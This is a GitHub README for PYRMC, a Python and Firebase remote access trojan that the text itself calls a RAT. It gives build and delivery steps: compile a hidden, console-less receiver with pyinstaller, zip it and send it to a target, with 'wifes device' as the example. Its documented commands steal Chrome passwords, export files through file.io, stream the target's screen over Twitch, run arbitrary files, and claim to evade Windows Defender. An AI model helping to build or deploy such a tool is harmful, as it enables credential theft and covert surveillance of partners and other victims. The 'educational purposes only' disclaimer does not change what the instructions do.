<h1 align="center">
  <br>
<img src="https://github.com/akbartaimurr/PYRMC/assets/134905706/8ec8d584-8e30-4ae4-be35-4bfe248ab266" alt="Markdownify" width="250"></a>
</h1>

<h4 align="center">A simple but effective remote controlling app made using <a href="http://python.org" target="_blank">Python</a> and <a href="http://firebase.google.com" target="_blank">Firebase</a></h4>


<p align="center">
  <a href="#key-features">Key Features</a> •
  <a href="#how-to-build">How to Build</a> •
  <a href="#documentation">Documentation</a> •
  <a href="#credits">Credits</a> •
  <a href="#license">License</a>
</p>

![Recording 2024-05-04 154039](https://github.com/akbartaimurr/PYRMC/assets/134905706/2b818bf5-9840-418f-9013-f19e894cd31c)
> [!WARNING]  
> As the owner of PYRMC, I am not responsible of what you use the script or app for. Please use this tool for educational purposes only!

## Key Features

* Get targets PC Information
  - OS Version, Ram, Storage etc.
* Get targets Chrome Passwords
* Get list of all current processes
* Import files to targets computer
* Play sound on targets computer
* View targets screen via twitch
* Run tasks on targets computer
* Display video files on targets computer
* Display image on targets computer
* Export files from targets computer to your computer
* List files in directories
* Not detected by windows defender


> [!NOTE]  
> You can see how these commands work and how to use them in the  <a href="#documentation">Documentation</a>

## How To Build

To clone and run this script you'll need <a href="https://python.org">Python</a>. You can use any version after python3, You will also need PIP, which can be downloaded with python.
After downloading python and pip, clone this repository or download this repo, then follow the following steps:
```bash
# Clone this repository
 git clone https://github.com/akbartaimurr/PYRMC

# Go into the repository
 cd PYRMC

# Install dependencies
run requirements.bat

```
After installing all the dependencies and requirements for this project, follow the steps below...
<br>
For each target device, you need a seperate `reciever.py` , `sender.py` and storage folder, so create a folder named for the target device you are aiming for
example `wifes device`

After creating the folder, copy `reciever.py` and `sender.py` and `storage folder` to the folder you created (ex. `wifes device`)
...
Now, you need to get your firebase private key: (make sure you have created a project with a web app already)
`https://console.firebase.google.com/project/yourproject/settings/serviceaccounts/adminsdk`
Scroll down, click on python and then click on `generate new private key`

It should download a `.json` file to your computer,
rename the file cred.json and put it inside your `storage folder` inside the target device folder (ex. `wifes device`)

### Step 2
edit `reciever.py` to input your twitch values (lines 25-30):
```python
...

cred = credentials.Certificate("storage/cred.json")  # Firebase Private Key Path
firebase_admin.initialize_app(cred)
db = firestore.client()

# Initialize Twitch client with your client ID
twitch_client = twitch.TwitchClient(client_id='')

```
(lines 191-192):
```python
        # Replace 'your_stream_key' with your actual Twitch stream key
        stream_key = ''
```
(lines 208-209)
```python
        # Get the stream URL
        stream_url = f''
```

### Step 3

After editing the values use pyinstaller to build your reciever.py into an exe
```bash
pyinstaller --noconfirm --onefile --noconsole  "path_to_reciever.py"
```
After building the exe file, copy it to your folder and zip `storage` and `reciever.exe`.
You can now send the zip archive to your target

## Sender.py
To use sender.py and target the reciever you just built, create a storage folder where your sender.py is located, in this case it's `wifes device`
put the same `cred.json` inside the storage folder
after doing those steps, you can run the file
```bash
python sender.py
```
In order for you to send commands to the reciever the reciever should be open on the other persons computer (ie. `wifes device`)


> [!WARNING]  
> As the owner of PYRMC, I am not responsible of what you use the script or app for. Please use this tool for educational purposes only!

## Documentation

This documentation does not tell how to clone and install this software, rather it will tell how to use the commands inside this RAT.
PYRMC works with functions and attributes. From sender.py, you can send commands to a Firestore Database and reciever.py (on the targets machine) will read these commands and based on the commands it will run code.

Assuming that you have used `--noconsole` when building reciever.py, there will be no terminal and all code will be running in the background.
Below you can find the list of commands:
```python
GET:
get.pcinfo
get.chromepaswords
get.processes

OS:
os.import
os.playsound
os.sharescreen
os.runtask
os.displayvideo
os.displayimage
os.export

LS:
ls[directory]
ls.storage 
```
### get.pcinfo ------------------------------------------------------
```get.pcinfo``` is a command that is pretty much self-explanitory, it allows you to gather pc information about the targets computer. This command has no other attributes and registering this command just gives you back the pc information of the targets computer

### get.chromepasswords ------------------------------------------------------
```get.chromepasswords``` is a command built to allow users that have sender.py to get the chrome passwords of the targets computer. whatever you want to do with these passwords is your choice but please use this for educational purposes only. This command was built using : <a href="https://github.com/ohyicong/decrypt-chrome-passwords">Decrypt Chrome Passwords</a> which is a repository made by ohyicong. 

### get.processes ------------------------------------------------------
```get.processes``` is a command that allows users with sender.py to get the list of current active processes (both apps and background processes) on the targets computer. Typing this into the sender.py terminal will give you an overwhelming list of active processes so it's recommended to check the firebase output response located in the firestore your created when building as it is easier to understand.

### os.import ------------------------------------------------------
```os.import``` is a command made to import files from your computer to the targets computer. when typing os.import you don't need to type in anything else, just type in ```os.import``` and it will prompt you to import a file. This file has to be hosted on the web, for example, if you wanted to import a file called ```example.png``` you would have to use a third party service that allows you to host images temporarily, then you need to obtain the link with the file extension on the end (ie. ```exampleimagehosting.com/host/example.png```) that way the program can download the file to the targets computer. future versions of PYRMC might fix this and make this command easier to use.

### os.playsound ------------------------------------------------------
```os.playsound``` allows to play sounds on the targets computer via the pygame python library. The sound file has to already be on the targets computer and if you want to import a sound file to the targets computer, use ```os.import```.

Once users type this command in it will prompt for the ```dir of sound to be played ? (has to be on victims PC! use os.import to import file to pc) >>``` so paste in the directory or path of the sound (ie. ```storage/sound.mp3```)

### os.sharescreen ------------------------------------------------------
```os.sharescreen``` utilizes the twitch developers console and stream keys to start a private livestream of the targets computer. it will then send the livestream link to the output in firebase, allowing users with sender.py to view the targets screen.

### os.runtask ------------------------------------------------------
```os.runtask``` this is a powerful command that allows you to run files on the tagets machine. the files have to already be on the targets machine so use ```os.import``` if you want to import files to the targets machine. once the hacker has typed this in, it will prompt for the path of the file to run the task, and the hacker can type in the path (ie, ```storage/example.exe```). This will start the file/task.

### os.displayvideo ------------------------------------------------------
```os.displayvideo``` allows to display a video file on the users machine using ```cv2``` python library.

Once the hacker types this in, it prompts for the path of the video, which once again has to be on the targets machine so you can import the video using ```os.import```.

### os.displayimage ------------------------------------------------------
```os.displayimage``` allows to display a image file on the users machine using ```pygame``` python library.

Once the hacker types this in, it prompts for the path of the image (yes, has to be on the targets machine, use ```os.import``` to import to targets machine)

### os.export ------------------------------------------------------
```os.export``` allows to export files from the targets computer to the hackers computer. this utilizes file.io to temporarily host the file on the targets machine which can then be downloaded on the hackers computer. once the hacker types this in in the sender.py it prompts for the location of the file they want to export to their computer on the targets computer.

### ls (listing command) ------------------------------------------------------
```ls``` is a linux inspired command which allows for listing the files in a directory on the targets computer. once the hacker types this, it prompts them for the location of the directory they want to list the files of. the directory has to be on the targets machine.

### ls.storage ------------------------------------------------------
```ls.storage``` is a command that allows the hacker to view the storage folder which you exported to the targets machine with ```reciever.py``` storage acts like a root sort of folder with dependencies for reciever.py like ```cred.json``` and ```ffmpeg``` but also throughout this docs you have seen it being mentioned many times. ```ls.storage``` allows to list the files in the storage folder. you can use this maybe after importing a file to the storage folder and want to verify if it is there.

That's all the current list of commands, there will be updates! Don't sweat it 😂

## Credits

This software uses the following open source repos
<a href="https://github.com/ohyicong/decrypt-chrome-passwords">https://github.com/ohyicong/decrypt-chrome-passwords</a>

## Support
<a href="https://www.youtube.com/@urdadflip">
	<img src="https://github.com/akbartaimurr/PYRMC/assets/134905706/58346362-44bb-419b-a587-77744db6aeb5" width="160">
</a>

## License

MIT

---

